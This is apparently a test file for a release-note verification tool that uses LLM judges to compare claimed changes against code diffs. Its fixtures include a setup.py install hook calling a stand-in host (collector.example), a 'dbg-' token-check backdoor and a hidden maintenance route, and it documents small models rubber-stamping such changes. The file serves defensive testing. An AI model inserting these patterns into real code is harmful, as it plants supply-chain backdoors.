// SPDX-License-Identifier: GPL-3.0-or-later
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { computeCoverage, isGeneratedEntry, isVagueClaim, medianVerdict, verifyClaims } from "../src/verify.ts";
import { hunkFunctions } from "../src/match.ts";
import {
  buildJudgePrompt,
  parseSurplusOutput,
  parseJudgeResponse,
  extractJsonObject,
  selectEngine,
  type JudgeVerdict,
} from "../src/judge.ts";
import { withVerdictCache } from "../src/cache.ts";
import type { Claim, Commit } from "../src/types.ts";

function claim(text: string, prNumbers: number[] = []): Claim {
  return {
    id: 0,
    section: "What's Changed",
    text,
    kind: "change",
    prNumbers,
    shas: [],
    advisories: [],
    codeSpans: [],
  };
}

function commit(subject: string, prNumbers: number[] = []): Commit {
  return { sha: "abc123def", subject, body: "", author: "dev", prNumbers };
}

test("isGeneratedEntry: PR-list boilerplate whose title equals the squash subject", () => {
  const c1 = claim("OpenDAL S3 parameter support by @txase in #6127", [6127]);
  assert.equal(isGeneratedEntry(c1, [commit("OpenDAL S3 parameter support (#6127)", [6127])]), true);
  // Handwritten claim: no attribution tail.
  assert.equal(isGeneratedEntry(claim("SSRF via the icon endpoint"), [commit("Fix icons")]), false);
  // Attribution tail but the title diverges from the commit.
  const c2 = claim("Something entirely different by @x in #7", [7]);
  assert.equal(isGeneratedEntry(c2, [commit("Actual subject (#7)", [7])]), false);
});

test("isGeneratedEntry: sha-list changelog entries restating the commit subject", () => {
  const c = claim("f885d87827bcae30a07063f2723cd03458144a00 Fix invalid ip syntax");
  c.shas = ["f885d87827bcae30a07063f2723cd03458144a00"];
  const target = { sha: "f885d87827bcae30a07063f2723cd03458144a00", subject: "Fix invalid ip syntax", body: "", author: "dev", prNumbers: [] };
  assert.equal(isGeneratedEntry(c, [target]), true);
  // Same sha but diverging text stays a real (checkable) claim.
  const diverging = claim("f885d87827bcae30a07063f2723cd03458144a00 Completely different statement");
  diverging.shas = ["f885d87827bcae30a07063f2723cd03458144a00"];
  assert.equal(isGeneratedEntry(diverging, [target]), false);
});

test("isVagueClaim: no content tokens beyond boilerplate", () => {
  assert.equal(isVagueClaim(claim("Updates and fixes by @BlackDex in #7235")), true);
  assert.equal(isVagueClaim(claim("Misc updates and fixes by @BlackDex in #7406")), true);
  assert.equal(isVagueClaim(claim("Reject unrecognised DATABASE_URL instead of silent SQLite fallback")), false);
});

test("hunkFunctions extracts declaration context from hunk headers", () => {
  const patch = [
    "@@ -10,4 +10,6 @@ pub async fn register_access(uuid: &str) -> Result<()> {",
    "+    let x = 1;",
    "@@ -50,2 +52,3 @@ impl SendHeaders",
    "+    field: bool,",
    "@@ -1,1 +1,2 @@ function handleClick(event) {",
    "+  return;",
    "@@ -7,1 +7,2 @@ func (s *Server) ServeHTTP(w http.ResponseWriter) {",
    "+  x()",
  ].join("\n");
  const fns = hunkFunctions(patch);
  assert.ok(fns.includes("register_access"));
  assert.ok(fns.includes("SendHeaders"));
  assert.ok(fns.includes("handleClick"));
  assert.ok(fns.includes("ServeHTTP"), `Go method receiver: got ${fns.join(",")}`);
  assert.ok(!fns.includes("func"));
});

function vote(verdict: JudgeVerdict["verdict"]): JudgeVerdict {
  return { verdict, confidence: 0.9, files: [], reasoning: verdict };
}

test("medianVerdict: one outlier cannot flip the result", () => {
  assert.equal(medianVerdict([vote("no-evidence"), vote("verified"), vote("verified")]).verdict, "verified");
  assert.equal(medianVerdict([vote("contradicted"), vote("contradicted"), vote("partial")]).verdict, "contradicted");
  assert.equal(medianVerdict([vote("no-evidence")]).verdict, "no-evidence");
  // Two votes: the milder one wins (flagging needs a majority).
  assert.equal(medianVerdict([vote("contradicted"), vote("verified")]).verdict, "verified");
});

test("parseJudgeResponse: need-protocol and verdicts", () => {
  const need = parseJudgeResponse('{"need":["src/a.rs","src/b.rs"]}');
  assert.ok("need" in need);
  assert.deepEqual((need as { need: string[] }).need, ["src/a.rs", "src/b.rs"]);
  const verdict = parseJudgeResponse('{"verdict":"verified","confidence":0.8,"files":[],"reasoning":"x"}');
  assert.ok(!("need" in verdict));
});

test("withVerdictCache: second call with the same prompt hits the disk", async () => {
  // Own cache home: the real one may not exist (or may be refused) on the
  // machine running the suite, and a test must not write into the user's.
  process.env.XDG_CACHE_HOME = mkdtempSync(join(tmpdir(), "crii-cache-"));
  let calls = 0;
  const engine = withVerdictCache({
    name: "test-stub",
    judge: async () => {
      calls++;
      return `response-${calls}`;
    },
  });
  const prompt = `cache-test-${process.pid}-${process.hrtime.bigint()}`;
  const first = await engine.judge(prompt);
  const second = await engine.judge(prompt);
  assert.equal(first, second);
  assert.equal(calls, 1);
});

test("extractJsonObject repairs unterminated small-model output", () => {
  // Qwen3.5 pattern: closes the reasoning string but drops the final brace.
  const noBrace = parseJudgeResponse(
    '{"verdict":"verified","confidence":0.9,"files":["a.rs"],"reasoning":"fix confirmed."',
  );
  assert.ok(!("need" in noBrace));
  assert.equal(noBrace.verdict, "verified");
  assert.equal(noBrace.reasoning, "fix confirmed.");
  // Harder: stops mid-string inside a nested array.
  const midString = extractJsonObject('{"surplus":[{"description":"new endpo') as {
    surplus: Array<{ description: string }>;
  };
  assert.equal(midString.surplus[0].description, "new endpo");
  assert.throws(() => extractJsonObject("no json here"), /no JSON object/);
});

test("selectEngine: openai needs an explicit model, then builds the engine", () => {
  assert.throws(() => selectEngine({ engine: "openai" }), /--model/);
  const engine = selectEngine({ engine: "openai", model: "qwen3:8b" });
  assert.equal(engine?.name, "openai/qwen3:8b@4096");
});

test("rankCalibrations: accuracy first, rubber-stamp risk second, speed last", async () => {
  const { rankCalibrations } = await import("../src/calibrate.ts");
  const cal = (model: string, passed: number, overVerified: number, avgMs: number | null) => ({
    engine: `openai/${model}`,
    model,
    outcomes: new Array(8).fill({}),
    passed,
    overVerified,
    avgMs,
  });
  const ranked = rankCalibrations([
    cal("slow-accurate", 8, 0, 9000),
    cal("fast-rubberstamp", 6, 2, 1000),
    cal("fast-honest", 6, 0, 1000),
    cal("cached-accurate", 8, 0, null),
  ]);
  assert.deepEqual(
    ranked.map((r) => r.model),
    ["slow-accurate", "cached-accurate", "fast-honest", "fast-rubberstamp"],
  );
});

test("escalation engine overrides release-critical local verdicts", async () => {
  const data = {
    repoLabel: "t/t",
    baseRef: "v1",
    headRef: "v2",
    notes: "",
    commits: [],
    files: [
      {
        path: "src/auth.rs",
        status: "modified",
        additions: 2,
        deletions: 0,
        patch: "@@ -1,1 +1,3 @@ fn check()\n+    validate_token();\n+    audit();\n",
      },
    ],
    commitFiles: async () => [],
    warnings: [],
  };
  const weak = {
    name: "weak",
    judge: async () =>
      '{"verdict":"no_evidence","confidence":0.9,"files":[],"reasoning":"local model unsure"}',
  };
  const strong = {
    name: "strong",
    judge: async () =>
      '{"verdict":"verified","confidence":0.95,"files":["src/auth.rs"],"reasoning":"token validation added"}',
  };
  const [result] = await verifyClaims(
    data,
    [claim("Add token validation to auth check")],
    { judgeMode: "auto", engine: weak, escalateEngine: strong, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000 },
  );
  assert.equal(result.verdict, "verified");
  assert.ok(result.evidence.methods.includes("escalated"));
  assert.equal(result.reasoning, "token validation added");
});

function releaseData(files: Array<{ path: string; patch: string }>) {
  return {
    repoLabel: "t/t",
    baseRef: "v1",
    headRef: "v2",
    notes: "",
    commits: [] as Commit[],
    files: files.map((f) => ({
      path: f.path,
      status: "modified",
      additions: 3,
      deletions: 1,
      patch: f.patch,
    })),
    commitFiles: async () => [],
    warnings: [] as string[],
  };
}

test("setup.py shape: local 'verified' under a non-security section escalates", async () => {
  // The 9B rubber-stamped an install hook as "Packaging cleanup" under
  // "What's Changed" — no advisory, no Security section, so the old
  // claim-only trigger would not have escalated.
  const data = releaseData([
    {
      path: "setup.py",
      patch:
        '@@ -10,3 +10,9 @@ setup(\n+# packaging cleanup\n+class PostInstall(install):\n+    def run(self):\n+        urllib.request.urlopen("https://collector.example/p").read()\n+        install.run(self)\n+    cmdclass={"install": PostInstall},\n',
    },
  ]);
  let escalations = 0;
  const local = {
    name: "local",
    judge: async () =>
      '{"verdict":"verified","confidence":0.9,"files":[],"reasoning":"routine packaging changes"}',
  };
  const strong = {
    name: "strong",
    judge: async () => {
      escalations++;
      return '{"verdict":"contradicted","confidence":0.95,"files":["setup.py"],"reasoning":"install hook fetches remote code"}';
    },
  };
  const [result] = await verifyClaims(data, [claim("Packaging cleanup")], {
    judgeMode: "all", engine: local, escalateEngine: strong, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
  });
  assert.equal(escalations, 1);
  assert.equal(result.verdict, "contradicted");
  assert.ok(result.evidence.methods.includes("escalated"));
});

test("a 'verified' on non-sensitive paths does not escalate", async () => {
  const data = releaseData([
    { path: "src/markdown.ts", patch: "@@ -1,1 +1,2 @@\n+export const tableAlign = 'left';\n" },
  ]);
  let escalations = 0;
  const local = {
    name: "local",
    judge: async () =>
      '{"verdict":"verified","confidence":0.9,"files":["src/markdown.ts"],"reasoning":"alignment constant added"}',
  };
  const strong = {
    name: "strong",
    judge: async () => {
      escalations++;
      return '{"verdict":"verified","confidence":0.9,"files":[],"reasoning":"unused"}';
    },
  };
  const [result] = await verifyClaims(data, [claim("Improve markdown table alignment")], {
    judgeMode: "all", engine: local, escalateEngine: strong, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
  });
  assert.equal(escalations, 0);
  assert.equal(result.verdict, "verified");
  assert.ok(!result.evidence.methods.includes("escalated"));
});

test("every attack-shape golden case escalates a rubber-stamped local 'verified'", async () => {
  const { readFile } = await import("node:fs/promises");
  const golden = JSON.parse(
    await readFile(new URL("./eval/golden.json", import.meta.url), "utf8"),
  ) as Array<{ name: string; section: string; claim: string; hunks: Array<{ path: string; hunk: string }> }>;
  const attackShapes = [
    "fabricated-feature-vs-unrelated-migration",
    "js-lockfile-nonregistry-source",
    "setup-py-install-hook-vs-cleanup-claim",
    "go-module-source-rename-vs-update-claim",
    "version-claim-vs-actual-bump",
  ];
  for (const name of attackShapes) {
    const gcase = golden.find((g) => g.name === name);
    assert.ok(gcase, `golden case ${name} missing`);
    const data = releaseData(gcase.hunks.map((h) => ({ path: h.path, patch: h.hunk })));
    const cl = claim(gcase.claim);
    cl.section = gcase.section;
    let escalations = 0;
    const rubberStamp = {
      name: "local-9b",
      judge: async () =>
        JSON.stringify({
          verdict: "verified",
          confidence: 0.9,
          files: gcase.hunks.map((h) => h.path),
          reasoning: "looks fine",
        }),
    };
    const strong = {
      name: "strong",
      judge: async () => {
        escalations++;
        return '{"verdict":"contradicted","confidence":0.95,"files":[],"reasoning":"malicious change"}';
      },
    };
    const [result] = await verifyClaims(data, [cl], {
      judgeMode: "all", engine: rubberStamp, escalateEngine: strong, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
    });
    assert.equal(escalations, 1, `${name}: expected exactly one escalation call`);
    assert.equal(result.verdict, "contradicted", name);
    assert.ok(result.evidence.methods.includes("escalated"), name);
  }
});

test("judge prompt: circularity rule always, need guidance only with allowNeed", () => {
  const base = {
    repoLabel: "t/t",
    baseRef: "v1",
    headRef: "v2",
    section: "Bug Fixes",
    claimText: "Fix race in cleanup.go",
    hunks: [],
    commits: [],
  };
  const withNeed = buildJudgePrompt({ ...base, allPaths: ["a.go"], allowNeed: true });
  assert.ok(withNeed.includes("names a file or function whose diff is not shown"));
  const withoutNeed = buildJudgePrompt(base);
  assert.ok(!withoutNeed.includes("names a file or function"));
  assert.ok(withoutNeed.includes("notes cannot prove themselves"));
});

test("a changelog-only commit does not become evidence for a vague claim", async () => {
  // Anchored vague claim ("Updates and fixes") whose commit only touches the
  // changelog: the old fallback sent that hunk to the judge — the notes
  // proving the notes. The judge must now see no evidence at all.
  const cl = claim("Updates and fixes by @x in #7", [7]);
  const linked: Commit = { sha: "abc123def", subject: "Bump deps and tweak CI (#7)", body: "", author: "dev", prNumbers: [7] };
  const changelogFile = {
    path: "CHANGELOG.md",
    status: "modified",
    additions: 2,
    deletions: 0,
    patch: "@@ -1,2 +1,4 @@\n # Changelog\n+\n+- Updates and fixes",
  };
  const data = {
    repoLabel: "t/t",
    baseRef: "v1",
    headRef: "v2",
    notes: "",
    commits: [linked],
    files: [changelogFile],
    commitFiles: async () => [changelogFile],
    warnings: [] as string[],
  };
  const prompts: string[] = [];
  const engine = {
    name: "capture",
    judge: async (prompt: string) => {
      prompts.push(prompt);
      return '{"verdict":"no_evidence","confidence":0.8,"files":[],"reasoning":"nothing shown"}';
    },
  };
  const [result] = await verifyClaims(data, [cl], {
    judgeMode: "auto", engine, escalateEngine: null, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
  });
  assert.equal(result.verdict, "no-evidence");
  const claimPrompts = prompts.filter((p) => p.includes("Candidate diff evidence"));
  assert.ok(claimPrompts.length > 0);
  for (const p of claimPrompts) {
    assert.ok(!p.includes("--- CHANGELOG.md"), "changelog hunk leaked into judge evidence");
    assert.ok(p.includes("(no matching hunks found)"));
  }
});

test("calibration offers the need protocol and the case's full file list", async () => {
  const { runCalibration } = await import("../src/calibrate.ts");
  const prompts: string[] = [];
  const engine = {
    name: "need-mock",
    judge: async (prompt: string) => {
      prompts.push(prompt);
      return '{"need":["internal/session/cleanup.go"]}';
    },
  };
  const cal = await runCalibration(engine, 4);
  const needCase = cal.outcomes.find((o) => o.name === "legit-need-more-files");
  assert.ok(needCase);
  assert.equal(needCase.pass, true);
  assert.equal(needCase.got, "need");
  const needPrompt = prompts.find((p) => p.includes("internal/session/cleanup.go"));
  assert.ok(needPrompt, "need case prompt must list the file the claim names");
  assert.ok(needPrompt.includes('{"need":["path1","path2"]}'), "need protocol must be offered");
});

test("parseSurplusOutput validates and caps items", () => {
  const items = parseSurplusOutput(
    'noise {"surplus":[{"description":"new endpoint /admin","file":"src/api.rs","notable":true},{"description":"comment fix","file":"a.rs","notable":false}],"reasoning":"x"} tail',
  );
  assert.equal(items.length, 2);
  assert.equal(items[0].notable, true);
  assert.equal(items[1].notable, false);
  assert.deepEqual(parseSurplusOutput('{"surplus":[]}'), []);
});

test("a note echoing its own commit subject is not evidence about the diff", async () => {
  // The whole attack: the author writes the note and the commit message, so
  // "they agree" is a statement about one person's copy-paste, not about the
  // code. Pre-fix this scored verified (0.90) with the judge never called.
  const linked: Commit = {
    sha: "4bce803d7b",
    subject: "Improve token cache eviction under load (#42)",
    body: "",
    author: "mallory",
    prNumbers: [42],
  };
  const backdoored = {
    path: "src/auth.js",
    status: "modified",
    additions: 4,
    deletions: 1,
    patch:
      "@@ -1,3 +1,6 @@ function verifyToken(token)\n" +
      "+  if (token.startsWith('dbg-')) return true;\n" +
      "   return checkSignature(token);\n",
  };
  const data = {
    repoLabel: "t/t",
    baseRef: "v1",
    headRef: "v2",
    notes: "",
    commits: [linked],
    files: [backdoored],
    commitFiles: async () => [backdoored],
    warnings: [] as string[],
  };
  const cl = claim("Improve token cache eviction under load (#42)", [42]);

  let judged = 0;
  const engine = {
    name: "counting",
    judge: async () => {
      judged++;
      return '{"verdict":"contradicted","confidence":1,"files":[],"reasoning":"backdoor"}';
    },
  };
  // --judge auto (the default) must route this to the judge, not settle it.
  const [withJudge] = await verifyClaims(data, [cl], {
    judgeMode: "auto", engine, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
  });
  assert.equal(judged > 0, true, "the judge must see a claim the diff does not support");
  assert.equal(withJudge.verdict, "contradicted");

  // And with no judge at all it may not claim more than "there is an anchor".
  const [deterministic] = await verifyClaims(data, [claim("Improve token cache eviction under load (#42)", [42])], {
    judgeMode: "off", engine: null, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
  });
  assert.equal(deterministic.verdict, "partial");
  assert.match(deterministic.reasoning, /restates the commit subject/);
});

test("one identifier hit in the linked commit is a lead, not a verified verdict", async () => {
  const linked: Commit = { sha: "aa11bb22cc", subject: "chore: tidy", body: "", author: "dev", prNumbers: [7] };
  const file = {
    path: "src/session.js",
    status: "modified",
    additions: 1,
    deletions: 0,
    patch: "@@ -1,1 +1,2 @@\n+const verifyToken = null;\n",
  };
  const data = {
    repoLabel: "t/t", baseRef: "v1", headRef: "v2", notes: "",
    commits: [linked], files: [file], commitFiles: async () => [file], warnings: [] as string[],
  };
  const cl: Claim = { ...claim("Rewrote `verifyToken` for constant-time comparison (#7)", [7]), codeSpans: ["verifyToken"] };
  const [r] = await verifyClaims(data, [cl], {
    judgeMode: "off", engine: null, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
  });
  assert.equal(r.verdict, "partial");
});

test("a repeated line that points into this release is still a claim", async () => {
  // Both sets of notes are written by the publisher, so "I said it last time
  // too" cannot be what takes a claim out of the check. Standing text really
  // is standing text: it anchors nowhere in this range.
  const linked: Commit = {
    sha: "cafe1234ab",
    subject: "Wire maintenance route (#42)",
    body: "",
    author: "mallory",
    prNumbers: [42],
  };
  const file = {
    path: "src/routes.js",
    status: "modified",
    additions: 1,
    deletions: 0,
    patch: "@@ -1,2 +1,3 @@ function routes(app)\n+  app.post('/__maint', run);\n",
  };
  const data = {
    repoLabel: "t/t", baseRef: "v1", headRef: "v2", notes: "",
    commits: [linked], files: [file], commitFiles: async () => [file], warnings: [] as string[],
  };
  const opts = { judgeMode: "off" as const, engine: null, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000 };

  const anchored = claim("Add a remote maintenance endpoint for support engineers (#42)", [42]);
  anchored.carriedOverFrom = "v1";
  const [checked] = await verifyClaims(data, [anchored], opts);
  assert.notEqual(checked.verdict, "skipped", "an anchored repeat is checked");

  const standing = claim("This project follows semantic versioning");
  standing.carriedOverFrom = "v1";
  const [skipped] = await verifyClaims(data, [standing], opts);
  assert.equal(skipped.verdict, "skipped");
  assert.match(skipped.reasoning, /Carried over verbatim/);
});

test("standing text documents nothing, so it earns no coverage", async () => {
  // The other coverage channel: a commit counts as documented when some claim
  // restates its subject (cherry-pick workflows lose the PR reference). Text
  // carried over from the base release was written before this commit existed,
  // so it cannot be what documents it.
  const linked: Commit = {
    sha: "beef5678cd",
    subject: "Refactor the plugin loader for lazy imports",
    body: "",
    author: "dev",
    prNumbers: [],
  };
  const file = {
    path: "src/loader.js", status: "modified", additions: 40, deletions: 2,
    patch: "@@ -1,2 +1,42 @@ function load()\n+  // forty new lines\n",
  };
  const data = {
    repoLabel: "t/t", baseRef: "v1", headRef: "v2", notes: "",
    commits: [linked], files: [file], commitFiles: async () => [file], warnings: [] as string[],
  };
  const opts = { judgeMode: "off" as const, engine: null, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000 };

  const standing = claim("Refactor the plugin loader for lazy imports");
  standing.carriedOverFrom = "v1";
  const skippedResults = await verifyClaims(data, [standing], opts);
  assert.equal(skippedResults[0].verdict, "skipped");
  const withStanding = await computeCoverage(data, [standing], skippedResults);
  assert.equal(withStanding.uncovered.length, 1, "the commit is still undocumented");

  // The same sentence, written for this release, does document it.
  const fresh = claim("Refactor the plugin loader for lazy imports");
  const freshResults = await verifyClaims(data, [fresh], opts);
  const withFresh = await computeCoverage(data, [fresh], freshResults);
  assert.equal(withFresh.uncovered.length, 0);
});
